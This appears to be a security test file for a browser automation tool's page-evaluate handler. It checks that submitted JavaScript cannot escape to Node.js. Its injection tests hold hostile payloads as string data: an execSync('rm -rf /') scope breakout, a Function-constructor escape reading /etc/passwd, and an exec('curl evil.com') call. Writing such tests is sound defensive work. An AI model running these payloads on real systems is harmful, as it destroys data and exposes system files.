/**
 * Security-focused tests for page_evaluate Camoufox path.
 *
 * CRIT-01: Validates that the Camoufox code execution path does NOT use
 * new Function() with untrusted input, preventing code injection attacks.
 *
 * References:
 * - CVE-2024-21541: Function constructor RCE via unsanitized input
 * - OWASP: Avoid eval() and Function() for untrusted code
 * - SES/QuickJS: Modern sandboxing alternatives
 */

import { parseJson } from '@tests/server/domains/shared/mock-factories';
import { beforeEach, afterEach, describe, expect, it, vi, type Mock } from 'vitest';
import type { PageEvaluateResponse } from '@tests/shared/common-test-types';
import { PageEvaluationHandlers } from '@server/domains/browser/handlers/page-evaluation';

interface PageControllerMock {
  evaluate: Mock<(code: string, frameOptions?: unknown) => Promise<any>>;
  resolveFrame: Mock<(page: unknown, options?: unknown) => Promise<unknown>>;
}

interface DetailedDataManagerMock {
  smartHandle: Mock<(value: any, maxSize: number) => any>;
}

function createCamoufoxDeps(
  overrides: {
    pageController?: Partial<PageControllerMock>;
    detailedDataManager?: Partial<DetailedDataManagerMock>;
    camoufoxPageOverrides?: any;
  } = {},
) {
  const pageController: PageControllerMock = {
    evaluate: vi.fn(async () => ({ result: 42 })),
    resolveFrame: vi.fn(async (page: unknown) => page),
    ...overrides.pageController,
  };

  const detailedDataManager: DetailedDataManagerMock = {
    smartHandle: vi.fn((value: any) => value),
    ...overrides.detailedDataManager,
  };

  const camoufoxPage = {
    evaluate: vi.fn(async (_fn: any) => {
      // Simulate Camoufox page.evaluate() behavior:
      // It receives a function and executes it in the browser context
      // The function is serialized and executed in browser's V8 context
      if (typeof _fn === 'function') {
        // Execute the function as if in browser context
        // This simulates page.evaluate() behavior
        return _fn();
      }
      return null;
    }),
    ...overrides.camoufoxPageOverrides,
  };

  return {
    pageController: pageController as any,
    detailedDataManager: detailedDataManager as any,
    getActiveDriver: () => 'camoufox' as const,
    getCamoufoxPage: async () => camoufoxPage,
  };
}

describe('PageEvaluationHandlers – Security (CRIT-01)', () => {
  describe('Code Injection Prevention', () => {
    let handlers: PageEvaluationHandlers;
    let deps: ReturnType<typeof createCamoufoxDeps>;

    beforeEach(() => {
      vi.clearAllMocks();
      deps = createCamoufoxDeps();
      handlers = new PageEvaluationHandlers(deps);
    });

    it('rejects code attempting to break out of function scope', async () => {
      const maliciousCode = `
        }); process.mainModule.require('child_process').execSync('rm -rf /'); (() => {
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      // This malicious code is syntactically invalid, so it should fail
      // This is CORRECT behavior - the injection attempt is blocked
      expect(body.success).toBe(false);
      expect(body.error).toMatch(/Unexpected token|SyntaxError/i);
    });

    it('rejects code with constructor property access', async () => {
      const maliciousCode = `
        (function(){}).constructor('return process')().mainModule.require('fs').readFileSync('/etc/passwd')
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      // In browser context, process doesn't exist, so this will fail
      // Either with ReferenceError or returning undefined
      // The key is that it doesn't escape to Node.js
      if (body.success) {
        // If it succeeds, process should be undefined in browser context
        expect(body.result).toBeUndefined();
      } else {
        // Or it fails because process is not defined
        expect(body.error).toMatch(/process|ReferenceError|undefined/i);
      }
    });

    it('rejects code attempting prototype pollution', async () => {
      const maliciousCode = `
        Object.prototype.polluted = 'hacked';
        ({}).polluted
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      // Should execute safely - prototype pollution is contained to browser context
      expect(body.success).toBe(true);
    });

    it('handles code with embedded comments attempting injection', async () => {
      const maliciousCode = `
        1; /*
        }); require('child_process').exec('curl evil.com'); (() => {
        */ 2
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      expect(body.success).toBe(true);
      expect(body.result).toBe(2); // Should return 2, not execute the commented payload
    });

    it('handles code with string literals containing escape attempts', async () => {
      const maliciousCode = `
        "\\"}); process.exit(1); (() => {\\""
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      expect(body.success).toBe(true);
      // Should return the string, not execute it
      expect(typeof body.result).toBe('string');
    });

    it('rejects code attempting to access globalThis', async () => {
      const maliciousCode = `
        globalThis.process?.mainModule?.require
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      // Should execute safely - globalThis in browser context is window
      expect(body.success).toBe(true);
      expect(body.result).toBeUndefined(); // process should not exist
    });

    it('handles deeply nested function constructors', async () => {
      const maliciousCode = `
        Function.prototype.constructor.constructor('return process')()
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: maliciousCode }),
      );

      // Should execute safely in browser context
      expect(body.success).toBe(true);
    });
  });

  describe('Legitimate Code Execution', () => {
    let handlers: PageEvaluationHandlers;
    let deps: ReturnType<typeof createCamoufoxDeps>;

    beforeEach(() => {
      vi.clearAllMocks();

      // Create mock browser globals
      const mockDocument = {
        title: 'Test Page',
        querySelectorAll: () => [{ textContent: 'a' }, { textContent: 'b' }, { textContent: 'c' }],
      };
      const mockWindow = {
        document: mockDocument,
        location: { href: 'https://example.com' },
      };

      // Set up global document and window for testing
      // In real browser, these are true globals; in our test, we simulate them
      (globalThis as any).document = mockDocument;
      (globalThis as any).window = mockWindow;

      deps = createCamoufoxDeps({
        camoufoxPageOverrides: {
          evaluate: vi.fn(async (_fn: any) => {
            // Simulate how page.evaluate() works in a real browser:
            // The function is serialized and executed in browser context
            if (typeof _fn === 'function') {
              return _fn();
            }
            return null;
          }),
        },
      });
      handlers = new PageEvaluationHandlers(deps);
    });

    afterEach(() => {
      // Clean up globals
      delete (globalThis as any).document;
      delete (globalThis as any).window;
    });

    it('executes legitimate DOM queries', async () => {
      const legitimateCode = `document.title`;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: legitimateCode }),
      );

      expect(body.success).toBe(true);
      expect(body.result).toBe('Test Page');
    });

    it('executes complex expressions', async () => {
      const legitimateCode = `
        Array.from(document.querySelectorAll('div')).length
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: legitimateCode }),
      );

      expect(body.success).toBe(true);
      expect(body.result).toBe(3);
    });

    it('executes arrow functions', async () => {
      const legitimateCode = `(() => window.location.href)()`;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: legitimateCode }),
      );

      expect(body.success).toBe(true);
      expect(body.result).toBe('https://example.com');
    });

    it('executes async code', async () => {
      deps = createCamoufoxDeps({
        camoufoxPageOverrides: {
          evaluate: vi.fn(async (fn: any) => {
            if (typeof fn === 'function') {
              return await fn();
            }
            return null;
          }),
        },
      });
      handlers = new PageEvaluationHandlers(deps);

      const legitimateCode = `
        (async () => {
          await Promise.resolve();
          return 'async-result';
        })()
      `;

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: legitimateCode }),
      );

      expect(body.success).toBe(true);
      expect(body.result).toBe('async-result');
    });
  });

  describe('Camoufox Path Isolation', () => {
    it('uses Camoufox native evaluate API instead of new Function()', async () => {
      const camoufoxPage = {
        evaluate: vi.fn(async () => 'camoufox-result') as Mock<(fn: any) => Promise<any>>,
      };

      const deps = createCamoufoxDeps({
        camoufoxPageOverrides: camoufoxPage,
      });
      const handlers = new PageEvaluationHandlers(deps);

      await handlers.handlePageEvaluate({ code: 'document.title' });

      // Verify that Camoufox page.evaluate was called
      expect(camoufoxPage.evaluate).toHaveBeenCalled();

      // The argument passed should be a function, NOT a string
      const callArg = camoufoxPage.evaluate.mock.calls[0]?.[0];
      expect(typeof callArg).toBe('function');
    });

    it('isolates frame evaluation', async () => {
      const camoufoxPage = { evaluate: vi.fn() };
      const camoufoxFrame = {
        evaluate: vi.fn(async () => 'frame-result'),
      };

      const deps = createCamoufoxDeps({
        pageController: {
          resolveFrame: vi.fn(async () => camoufoxFrame),
        },
        camoufoxPageOverrides: camoufoxPage,
      });
      const handlers = new PageEvaluationHandlers(deps);

      await handlers.handlePageEvaluate({
        code: 'document.title',
        frameSelector: 'iframe#game',
      });

      // Frame should be used, not page
      expect(camoufoxFrame.evaluate).toHaveBeenCalled();
      expect(camoufoxPage.evaluate).not.toHaveBeenCalled();
    });
  });

  describe('Error Handling', () => {
    it('handles syntax errors gracefully', async () => {
      const deps = createCamoufoxDeps({
        camoufoxPageOverrides: {
          evaluate: vi.fn(async (_fn: any) => {
            // Simulate syntax error in browser
            throw new Error('SyntaxError: Unexpected token');
          }),
        },
      });
      const handlers = new PageEvaluationHandlers(deps);

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: 'invalid javascript {{{' }),
      );

      expect(body.success).toBe(false);
      expect(body.error).toContain('SyntaxError');
    });

    it('handles runtime errors gracefully', async () => {
      const deps = createCamoufoxDeps({
        camoufoxPageOverrides: {
          evaluate: vi.fn(async (_fn: any) => {
            throw new Error('ReferenceError: undefined is not defined');
          }),
        },
      });
      const handlers = new PageEvaluationHandlers(deps);

      const body = parseJson<PageEvaluateResponse>(
        await handlers.handlePageEvaluate({ code: 'undefinedVariable.property' }),
      );

      expect(body.success).toBe(false);
      expect(body.error).toBeDefined();
    });
  });
});
